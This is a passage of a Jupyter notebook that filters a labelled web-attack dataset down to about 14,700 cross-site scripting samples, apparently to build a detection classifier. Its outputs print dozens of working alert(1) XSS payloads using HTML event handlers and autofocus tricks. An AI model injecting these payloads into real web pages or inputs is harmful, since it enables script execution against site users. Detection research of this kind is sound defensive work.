       "      <td>SQL Injection</td>\n",
       "      <td>POST</td>\n",
       "      <td>body (Q.)</td>\n",
       "      <td>0</td>\n",
       "      <td>201.0</td>\n",
       "      <td>17</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0.26</td>\n",
       "      <td>1</td>\n",
       "      <td>SQL Injection</td>\n",
       "      <td>POST</td>\n",
       "      <td>body (Q.)</td>\n",
       "      <td>0</td>\n",
       "      <td>201.0</td>\n",
       "      <td>17</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   sentence  attack_type_code    attack_type http_method   param_as  \\\n",
       "0     -3752                 1  SQL Injection        POST  body (Q.)   \n",
       "1  00:00:00                 0      No Attack        POST  body (Q.)   \n",
       "2         0                 0      No Attack        POST  body (Q.)   \n",
       "3      0.21                 1  SQL Injection        POST  body (Q.)   \n",
       "4      0.26                 1  SQL Injection        POST  body (Q.)   \n",
       "\n",
       "   flag_success_attack  http_status  param_length  Unnamed: 8  Unnamed: 9  \\\n",
       "0                    0        201.0            18         NaN         NaN   \n",
       "1                    0        201.0            14         NaN         NaN   \n",
       "2                    0        201.0            14         NaN         NaN   \n",
       "3                    0        201.0            17         NaN         NaN   \n",
       "4                    0        201.0            17         NaN         NaN   \n",
       "\n",
       "   Unnamed: 10  \n",
       "0          NaN  \n",
       "1          NaN  \n",
       "2          NaN  \n",
       "3          NaN  \n",
       "4          NaN  "
      ]
     },
     "execution_count": 782,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dsm.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 783,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 101117 entries, 0 to 101116\n",
      "Data columns (total 11 columns):\n",
      " #   Column               Non-Null Count   Dtype  \n",
      "---  ------               --------------   -----  \n",
      " 0   sentence             101117 non-null  object \n",
      " 1   attack_type_code     101117 non-null  int64  \n",
      " 2   attack_type          101117 non-null  object \n",
      " 3   http_method          101117 non-null  object \n",
      " 4   param_as             101117 non-null  object \n",
      " 5   flag_success_attack  101117 non-null  int64  \n",
      " 6   http_status          101109 non-null  float64\n",
      " 7   param_length         101117 non-null  int64  \n",
      " 8   Unnamed: 8           0 non-null       float64\n",
      " 9   Unnamed: 9           0 non-null       float64\n",
      " 10  Unnamed: 10          6934 non-null    float64\n",
      "dtypes: float64(4), int64(3), object(4)\n",
      "memory usage: 8.5+ MB\n"
     ]
    }
   ],
   "source": [
    "dsm.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 784,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "attack_type\n",
       "No Attack        49431\n",
       "SQL Injection    36938\n",
       "XSS              14748\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 784,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dsm = dsm[[\"sentence\", \"attack_type\"]]\n",
    "dsm[\"attack_type\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 785,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "sentence",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "attack_type",
         "rawType": "object",
         "type": "string"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "66912d12-a4d5-4c2c-8aed-4fdcbeb7d999",
       "rows": [
        [
         "0",
         "<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>",
         "XSS"
        ],
        [
         "1",
         "<em draggable=\"true\" ondragleave=\"alert(1)\">test</em>",
         "XSS"
        ],
        [
         "2",
         "<small onbeforecut=\"alert(1)\" contenteditable>test</small>",
         "XSS"
        ],
        [
         "3",
         "<article draggable=\"true\" ondragstart=\"alert(1)\">test</article>",
         "XSS"
        ],
        [
         "4",
         "<cite onkeyup=\"alert(1)\" contenteditable>test</cite>",
         "XSS"
        ],
        [
         "5",
         "<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>",
         "XSS"
        ],
        [
         "6",
         "<data onpointerleave=alert(1)>XSS</data>",
         "XSS"
        ],
        [
         "7",
         "<audio draggable=\"true\" ondragend=\"alert(1)\">test</audio>",
         "XSS"
        ],
        [
         "8",
         "<dd onbeforecopy=\"alert(1)\" contenteditable>test</dd>",
         "XSS"
        ],
        [
         "9",
         "<del id=x tabindex=1 onactivate=alert(1)></del>",
         "XSS"
        ],
        [
         "10",
         "<svg onbeforecut=\"alert(1)\" contenteditable>test</svg>",
         "XSS"
        ],
        [
         "11",
         "<optgroup onpointerover=alert(1)>XSS</optgroup>",
         "XSS"
        ],
        [
         "12",
         "<audio onpointermove=alert(1)>XSS</audio>",
         "XSS"
        ],
        [
         "13",
         "<aside onmouseout=\"alert(1)\">test</aside>",
         "XSS"
        ],
        [
         "14",
         "<canvas onbeforecut=\"alert(1)\" contenteditable>test</canvas>",
         "XSS"
        ],
        [
         "15",
         "<div draggable=\"true\" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>",
         "XSS"
        ],
        [
         "16",
         "<tbody draggable=\"true\" ondragenter=\"alert(1)\">test</tbody>",
         "XSS"
        ],
        [
         "17",
         "<object onmousedown=\"alert(1)\">test</object>",
         "XSS"
        ],
        [
         "18",
         "<area onbeforepaste=\"alert(1)\" contenteditable>test</area>",
         "XSS"
        ],
        [
         "19",
         "<template onpointerout=alert(1)>XSS</template>",
         "XSS"
        ],
        [
         "20",
         "<s onpointerup=alert(1)>XSS</s>",
         "XSS"
        ],
        [
         "21",
         "<select draggable=\"true\" ondrag=\"alert(1)\">test</select>",
         "XSS"
        ],
        [
         "22",
         "<a onmouseup=\"alert(1)\">test</a>",
         "XSS"
        ],
        [
         "23",
         "<style>:target {color: red;}</style><pre id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></pre>",
         "XSS"
        ],
        [
         "24",
         "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></a>",
         "XSS"
        ],
        [
         "25",
         "<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>",
         "XSS"
        ],
        [
         "26",
         "<time onclick=\"alert(1)\">test</time>",
         "XSS"
        ],
        [
         "27",
         "<canvas onbeforepaste=\"alert(1)\" contenteditable>test</canvas>",
         "XSS"
        ],
        [
         "28",
         "<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>",
         "XSS"
        ],
        [
         "29",
         "<center onclick=\"alert(1)\">test</center>",
         "XSS"
        ],
        [
         "30",
         "<h1 draggable=\"true\" ondragleave=\"alert(1)\">test</h1>",
         "XSS"
        ],
        [
         "31",
         "<div onkeyup=\"alert(1)\" contenteditable>test</div>",
         "XSS"
        ],
        [
         "32",
         "<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>",
         "XSS"
        ],
        [
         "33",
         "<dl draggable=\"true\" ondrag=\"alert(1)\">test</dl>",
         "XSS"
        ],
        [
         "34",
         "<div onpointerout=alert(1)>XSS</div>",
         "XSS"
        ],
        [
         "35",
         "<style>:target {color:red;}</style><slot id=x style=\"transition:color 1s\" ontransitionend=alert(1)></slot>",
         "XSS"
        ],
        [
         "36",
         "<applet onmouseover=\"alert(1)\">test</applet>",
         "XSS"
        ],
        [
         "37",
         "<figure onbeforecut=\"alert(1)\" contenteditable>test</figure>",
         "XSS"
        ],
        [
         "38",
         "<canvas onmousemove=\"alert(1)\">test</canvas>",
         "XSS"
        ],
        [
         "39",
         "<h1 onpaste=\"alert(1)\" contenteditable>test</h1>",
         "XSS"
        ],
        [
         "40",
         "<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>",
         "XSS"
        ],
        [
         "41",
         "<textarea onpointermove=alert(1)>XSS</textarea>",
         "XSS"
        ],
        [
         "42",
         "document.write",
         "XSS"
        ],
        [
         "43",
         "<area onpointerenter=alert(1)>XSS</area>",
         "XSS"
        ],
        [
         "44",
         "<marquee onbeforecut=\"alert(1)\" contenteditable>test</marquee>",
         "XSS"
        ],
        [
         "45",
         "<audio oncontextmenu=\"alert(1)\">test</audio>",
         "XSS"
        ],
        [
         "46",
         "<isindex onpointerup=alert(1)>XSS</isindex>",
         "XSS"
        ],
        [
         "47",
         "<strike onmouseup=\"alert(1)\">test</strike>",
         "XSS"
        ],
        [
         "48",
         "<kbd id=x tabindex=1 onfocus=alert(1)></kbd>",
         "XSS"
        ],
        [
         "49",
         "<table onbeforepaste=\"alert(1)\" contenteditable>test</table>",
         "XSS"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 14748
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sentence</th>\n",
       "      <th>attack_type</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;meter id=x tabindex=1 onbeforedeactivate=aler...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;em draggable=\"true\" ondragleave=\"alert(1)\"&gt;te...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;small onbeforecut=\"alert(1)\" contenteditable&gt;...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&lt;article draggable=\"true\" ondragstart=\"alert(1...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;cite onkeyup=\"alert(1)\" contenteditable&gt;test&lt;...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14743</th>\n",
       "      <td>&lt;data draggable=\"true\" ondragstart=\"alert(1)\"&gt;...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14744</th>\n",
       "      <td>&lt;sub draggable=\"true\" ondragend=\"alert(1)\"&gt;tes...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14745</th>\n",
       "      <td>&lt;dialog draggable=\"true\" ondragenter=\"alert(1)...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14746</th>\n",
       "      <td>&lt;iframe onblur=alert(1) id=x&gt;&lt;input autofocus&gt;</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14747</th>\n",
       "      <td>&lt;legend id=x tabindex=1 ondeactivate=alert(1)&gt;...</td>\n",
       "      <td>XSS</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>14748 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                sentence attack_type\n",
       "0      <meter id=x tabindex=1 onbeforedeactivate=aler...         XSS\n",
       "1      <em draggable=\"true\" ondragleave=\"alert(1)\">te...         XSS\n",
       "2      <small onbeforecut=\"alert(1)\" contenteditable>...         XSS\n",
       "3      <article draggable=\"true\" ondragstart=\"alert(1...         XSS\n",
       "4      <cite onkeyup=\"alert(1)\" contenteditable>test<...         XSS\n",
       "...                                                  ...         ...\n",
       "14743  <data draggable=\"true\" ondragstart=\"alert(1)\">...         XSS\n",
       "14744  <sub draggable=\"true\" ondragend=\"alert(1)\">tes...         XSS\n",
       "14745  <dialog draggable=\"true\" ondragenter=\"alert(1)...         XSS\n",
       "14746     <iframe onblur=alert(1) id=x><input autofocus>         XSS\n",
       "14747  <legend id=x tabindex=1 ondeactivate=alert(1)>...         XSS\n",
       "\n",
       "[14748 rows x 2 columns]"
      ]
     },
     "execution_count": 785,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_dsm = dsm[dsm[\"attack_type\"] == \"XSS\"]\n",
    "xss_dsm.reset_index(drop=True, inplace=True)\n",
    "xss_dsm "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 786,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/1843087523.py:1: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_dsm[\"attack_type\"] = xss_dsm[\"attack_type\"].apply(lambda x: 1 if x == \"XSS\" else 0)\n",
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/1843087523.py:2: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  xss_dsm.rename(columns={\"sentence\": \"payload\", \"attack_type\": \"xss\"}, inplace=True)\n"
     ]
    },
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "b5e435b1-6d6b-4539-8293-e95466b19383",
       "rows": [
        [
         "0",
         "<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>",
         "1"
        ],
        [
         "1",
         "<em draggable=\"true\" ondragleave=\"alert(1)\">test</em>",
         "1"
        ],
        [
         "2",
         "<small onbeforecut=\"alert(1)\" contenteditable>test</small>",
         "1"
        ],
        [
         "3",
         "<article draggable=\"true\" ondragstart=\"alert(1)\">test</article>",
         "1"
        ],
        [
         "4",
         "<cite onkeyup=\"alert(1)\" contenteditable>test</cite>",
         "1"
        ],
        [
         "5",
         "<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>",
         "1"
        ],
        [
         "6",
         "<data onpointerleave=alert(1)>XSS</data>",
         "1"
        ],
        [
         "7",
         "<audio draggable=\"true\" ondragend=\"alert(1)\">test</audio>",
         "1"
        ],
        [
         "8",
         "<dd onbeforecopy=\"alert(1)\" contenteditable>test</dd>",
         "1"
        ],
        [
         "9",
         "<del id=x tabindex=1 onactivate=alert(1)></del>",
         "1"
        ],
        [
         "10",
         "<svg onbeforecut=\"alert(1)\" contenteditable>test</svg>",
         "1"
        ],
        [
         "11",
         "<optgroup onpointerover=alert(1)>XSS</optgroup>",
         "1"
        ],
        [
         "12",
         "<audio onpointermove=alert(1)>XSS</audio>",
         "1"
        ],
        [
         "13",
         "<aside onmouseout=\"alert(1)\">test</aside>",
         "1"
        ],
        [
         "14",
         "<canvas onbeforecut=\"alert(1)\" contenteditable>test</canvas>",
         "1"
        ],
        [
         "15",
         "<div draggable=\"true\" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>",
         "1"
        ],
        [
         "16",
         "<tbody draggable=\"true\" ondragenter=\"alert(1)\">test</tbody>",
         "1"
        ],
        [
         "17",
         "<object onmousedown=\"alert(1)\">test</object>",
         "1"
        ],
        [
         "18",
         "<area onbeforepaste=\"alert(1)\" contenteditable>test</area>",
         "1"
        ],
        [
         "19",
         "<template onpointerout=alert(1)>XSS</template>",
         "1"
        ],
        [
         "20",
         "<s onpointerup=alert(1)>XSS</s>",
         "1"
        ],
        [
         "21",
         "<select draggable=\"true\" ondrag=\"alert(1)\">test</select>",
         "1"
        ],
        [
         "22",
         "<a onmouseup=\"alert(1)\">test</a>",
         "1"
        ],
        [
         "23",
         "<style>:target {color: red;}</style><pre id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></pre>",
         "1"
        ],
        [
         "24",
         "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></a>",
         "1"
        ],
        [
         "25",
         "<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>",
         "1"
        ],
        [
         "26",
         "<time onclick=\"alert(1)\">test</time>",
         "1"
        ],
        [
         "27",
         "<canvas onbeforepaste=\"alert(1)\" contenteditable>test</canvas>",
         "1"
        ],
        [
         "28",
         "<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>",
         "1"
        ],
        [
         "29",
         "<center onclick=\"alert(1)\">test</center>",
         "1"
        ],
        [
         "30",
         "<h1 draggable=\"true\" ondragleave=\"alert(1)\">test</h1>",
         "1"
        ],
        [
         "31",
         "<div onkeyup=\"alert(1)\" contenteditable>test</div>",
         "1"
        ],
        [
         "32",
         "<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>",
         "1"
        ],
        [
         "33",
         "<dl draggable=\"true\" ondrag=\"alert(1)\">test</dl>",
         "1"
        ],
        [
         "34",
         "<div onpointerout=alert(1)>XSS</div>",
         "1"
        ],
        [
         "35",
         "<style>:target {color:red;}</style><slot id=x style=\"transition:color 1s\" ontransitionend=alert(1)></slot>",
         "1"
        ],
        [
         "36",
         "<applet onmouseover=\"alert(1)\">test</applet>",
         "1"
        ],
        [
         "37",
         "<figure onbeforecut=\"alert(1)\" contenteditable>test</figure>",
         "1"
        ],
        [
         "38",
         "<canvas onmousemove=\"alert(1)\">test</canvas>",
         "1"
        ],
        [
         "39",
         "<h1 onpaste=\"alert(1)\" contenteditable>test</h1>",
         "1"
        ],
        [
         "40",
         "<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>",
         "1"
        ],
        [
         "41",
         "<textarea onpointermove=alert(1)>XSS</textarea>",
         "1"
        ],
        [
         "42",
         "document.write",
         "1"
        ],
        [
         "43",
         "<area onpointerenter=alert(1)>XSS</area>",
         "1"
        ],
        [
         "44",
         "<marquee onbeforecut=\"alert(1)\" contenteditable>test</marquee>",
         "1"
        ],
        [
         "45",
         "<audio oncontextmenu=\"alert(1)\">test</audio>",
         "1"
        ],
        [
         "46",
         "<isindex onpointerup=alert(1)>XSS</isindex>",
         "1"
        ],
        [
         "47",
         "<strike onmouseup=\"alert(1)\">test</strike>",
         "1"
        ],
        [
         "48",
         "<kbd id=x tabindex=1 onfocus=alert(1)></kbd>",
         "1"
        ],
        [
         "49",
         "<table onbeforepaste=\"alert(1)\" contenteditable>test</table>",
         "1"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 14748
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;meter id=x tabindex=1 onbeforedeactivate=aler...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;em draggable=\"true\" ondragleave=\"alert(1)\"&gt;te...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;small onbeforecut=\"alert(1)\" contenteditable&gt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&lt;article draggable=\"true\" ondragstart=\"alert(1...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;cite onkeyup=\"alert(1)\" contenteditable&gt;test&lt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14743</th>\n",
       "      <td>&lt;data draggable=\"true\" ondragstart=\"alert(1)\"&gt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14744</th>\n",
       "      <td>&lt;sub draggable=\"true\" ondragend=\"alert(1)\"&gt;tes...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14745</th>\n",
       "      <td>&lt;dialog draggable=\"true\" ondragenter=\"alert(1)...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14746</th>\n",
       "      <td>&lt;iframe onblur=alert(1) id=x&gt;&lt;input autofocus&gt;</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14747</th>\n",
       "      <td>&lt;legend id=x tabindex=1 ondeactivate=alert(1)&gt;...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>14748 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 payload  xss\n",
       "0      <meter id=x tabindex=1 onbeforedeactivate=aler...    1\n",
       "1      <em draggable=\"true\" ondragleave=\"alert(1)\">te...    1\n",
       "2      <small onbeforecut=\"alert(1)\" contenteditable>...    1\n",
       "3      <article draggable=\"true\" ondragstart=\"alert(1...    1\n",
       "4      <cite onkeyup=\"alert(1)\" contenteditable>test<...    1\n",
       "...                                                  ...  ...\n",
       "14743  <data draggable=\"true\" ondragstart=\"alert(1)\">...    1\n",
       "14744  <sub draggable=\"true\" ondragend=\"alert(1)\">tes...    1\n",
       "14745  <dialog draggable=\"true\" ondragenter=\"alert(1)...    1\n",
       "14746     <iframe onblur=alert(1) id=x><input autofocus>    1\n",
       "14747  <legend id=x tabindex=1 ondeactivate=alert(1)>...    1\n",
       "\n",
       "[14748 rows x 2 columns]"
      ]
     },
     "execution_count": 786,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_dsm[\"attack_type\"] = xss_dsm[\"attack_type\"].apply(lambda x: 1 if x == \"XSS\" else 0)\n",
    "xss_dsm.rename(columns={\"sentence\": \"payload\", \"attack_type\": \"xss\"}, inplace=True)\n",
    "xss_dsm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 787,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "f3d1374a-536e-4ffd-8a4e-348768cbcc21",
       "rows": [
        [
         "0",
         "<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>",
         "1"
        ],
        [
         "1",
         "<em draggable=\"true\" ondragleave=\"alert(1)\">test</em>",
         "1"
        ],
        [
         "2",
         "<small onbeforecut=\"alert(1)\" contenteditable>test</small>",
         "1"
        ],
        [
         "3",
         "<article draggable=\"true\" ondragstart=\"alert(1)\">test</article>",
         "1"
        ],
        [
         "4",
         "<cite onkeyup=\"alert(1)\" contenteditable>test</cite>",
         "1"
        ],
        [
         "5",
         "<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>",
         "1"
        ],
        [
         "6",
         "<data onpointerleave=alert(1)>XSS</data>",
         "1"
        ],
        [
         "7",
         "<audio draggable=\"true\" ondragend=\"alert(1)\">test</audio>",
         "1"
        ],
        [
         "8",
         "<dd onbeforecopy=\"alert(1)\" contenteditable>test</dd>",
         "1"
        ],
        [
         "9",
         "<del id=x tabindex=1 onactivate=alert(1)></del>",
         "1"
        ],
        [
         "10",
         "<svg onbeforecut=\"alert(1)\" contenteditable>test</svg>",
         "1"
        ],
        [
         "11",
         "<optgroup onpointerover=alert(1)>XSS</optgroup>",
         "1"
        ],
        [
         "12",
         "<audio onpointermove=alert(1)>XSS</audio>",
         "1"
        ],
        [
         "13",
         "<aside onmouseout=\"alert(1)\">test</aside>",
         "1"
        ],
        [
         "14",
         "<canvas onbeforecut=\"alert(1)\" contenteditable>test</canvas>",
         "1"
        ],
        [
         "15",
         "<div draggable=\"true\" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>",
         "1"
        ],
        [
         "16",
         "<tbody draggable=\"true\" ondragenter=\"alert(1)\">test</tbody>",
         "1"
        ],
        [
         "17",
         "<object onmousedown=\"alert(1)\">test</object>",
         "1"
        ],
        [
         "18",
         "<area onbeforepaste=\"alert(1)\" contenteditable>test</area>",
         "1"
        ],
        [
         "19",
         "<template onpointerout=alert(1)>XSS</template>",
         "1"
        ],
        [
         "20",
         "<s onpointerup=alert(1)>XSS</s>",
         "1"
        ],
        [
         "21",
         "<select draggable=\"true\" ondrag=\"alert(1)\">test</select>",
         "1"
        ],
        [
         "22",
         "<a onmouseup=\"alert(1)\">test</a>",
         "1"
        ],
        [
         "23",
         "<style>:target {color: red;}</style><pre id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></pre>",
         "1"
        ],
        [
         "24",
         "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></a>",
         "1"
        ],
        [
         "25",
         "<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>",
         "1"
        ],
        [
         "26",
         "<time onclick=\"alert(1)\">test</time>",
         "1"
        ],
        [
         "27",
         "<canvas onbeforepaste=\"alert(1)\" contenteditable>test</canvas>",
         "1"
        ],
        [
         "28",
         "<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>",
         "1"
        ],
        [
         "29",
         "<center onclick=\"alert(1)\">test</center>",
         "1"
        ],
        [
         "30",
         "<h1 draggable=\"true\" ondragleave=\"alert(1)\">test</h1>",
         "1"
        ],
        [
         "31",
         "<div onkeyup=\"alert(1)\" contenteditable>test</div>",
         "1"
        ],
        [
         "32",
         "<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>",
         "1"
        ],
        [
         "33",
         "<dl draggable=\"true\" ondrag=\"alert(1)\">test</dl>",
         "1"
        ],
        [
         "34",
         "<div onpointerout=alert(1)>XSS</div>",
         "1"
        ],
        [
         "35",
         "<style>:target {color:red;}</style><slot id=x style=\"transition:color 1s\" ontransitionend=alert(1)></slot>",
         "1"
        ],
        [
         "36",
         "<applet onmouseover=\"alert(1)\">test</applet>",
         "1"
        ],
        [
         "37",
         "<figure onbeforecut=\"alert(1)\" contenteditable>test</figure>",
         "1"
        ],
        [
         "38",
         "<canvas onmousemove=\"alert(1)\">test</canvas>",
         "1"
        ],
        [
         "39",
         "<h1 onpaste=\"alert(1)\" contenteditable>test</h1>",
         "1"
        ],
        [
         "40",
         "<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>",
         "1"
        ],
        [
         "41",
         "<textarea onpointermove=alert(1)>XSS</textarea>",
         "1"
        ],
        [
         "42",
         "document.write",
         "1"
        ],
        [
         "43",
         "<area onpointerenter=alert(1)>XSS</area>",
         "1"
        ],
        [
         "44",
         "<marquee onbeforecut=\"alert(1)\" contenteditable>test</marquee>",
         "1"
        ],
        [
         "45",
         "<audio oncontextmenu=\"alert(1)\">test</audio>",
         "1"
        ],
        [
         "46",
         "<isindex onpointerup=alert(1)>XSS</isindex>",
         "1"
        ],
        [
         "47",
         "<strike onmouseup=\"alert(1)\">test</strike>",
         "1"
        ],
        [
         "48",
         "<kbd id=x tabindex=1 onfocus=alert(1)></kbd>",
         "1"
        ],
        [
         "49",
         "<table onbeforepaste=\"alert(1)\" contenteditable>test</table>",
         "1"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 14748
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
